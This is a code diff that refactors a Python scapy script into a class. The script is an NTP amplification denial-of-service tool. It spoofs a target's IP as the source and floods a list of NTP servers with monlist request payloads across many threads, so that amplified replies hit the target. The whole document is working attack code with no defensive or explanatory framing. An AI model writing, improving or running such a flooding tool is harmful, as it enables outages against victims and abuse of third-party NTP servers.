@@ -3,47 +3,51 @@ import random
 import threading
 from scapy.all import *
 
-ip = raw_input("Target: ")
-threads = input("Threads: ")
-open_list = raw_input("List: ")
+ip = input("Target: ")
+threads = int(input("Threads: "))
+open_list = input("List: ")
 timer = float(input("Time(S): "))
 
-with open(open_list, "r") as fd:
-	lines = fd.readlines()
+class main:
+	def __init__(self, ip, threads, open_list, timer):
+		self.ip = ip
+		self.threads = threads
+		self.open_list = open_list
+		self.timer = timer
+		
+		self.mem_list = []
+		
+		self.payload = "\x17\x00\x03\x2a\x00\x00\x00\x00"
+		
+		self.timeout = time.time() + 1 * self.timer
 
-payload = "\x17\x00\x03\x2a\x00\x00\x00\x00"
+		self.append_to()
+		self.init_flood()
+		self.wait()
 
-i = 0
-ntp_list = []
+	def append_to(self):
+		with open(self.open_list, "r") as fd:
+			lines = fd.readlines()
+			for line in lines:
+				self.mem_list.append(line.strip())
 
-for line in lines:
-	ntp_list.append(line.rstrip("\n"))
+	def init_flood(self):
+		for i in range(self.threads):
+			threading.Thread(target=self.flood, daemon=True).start()
 
-if int(threads) > int(len(ntp_list)):
-	print("")
-	print("Current Threads: %s" % threads)
-	print("Max Threads: %s" % len(ntp_list))
-	print("Quitting...")
-	quit()
+	def flood(self):
+		while time.time() < self.timeout:
+			port = random.randint(1, 65535)
+			packet = IP(src=ip, dst=random.choice(self.mem_list))/UDP(sport=port, dport=123)/Raw(load=self.payload)
+			send(packet, verbose=0)
 
-timeout = time.time() + 1 * timer
+	def wait(self):
+		while time.time() < self.timeout:
+			try:
+				time.sleep(1)
+			except KeyboardInterrupt:
+				print("Quitting.")
+				break
 
-def ntpflood():
-	try:
-		def ntpflooder():
-			global i
-			while time.time() < timeout:
-				port = random.randint(1, 65535)
-				packet = IP(src=ip, dst=ntp_list[i])/UDP(sport=port, dport=123)/Raw(load=payload)
-				i += 1
-				send(packet, verbose=0)
-
-		for i in range(1):
-			thread = threading.Thread(target=ntpflooder)
-			thread.start()
-	except:
-		pass
-
-for i in range(int(threads)):
-	thread = threading.Thread(target=ntpflood)
-	thread.start()
+if __name__ == "__main__":
+	main(ip, threads, open_list, timer)
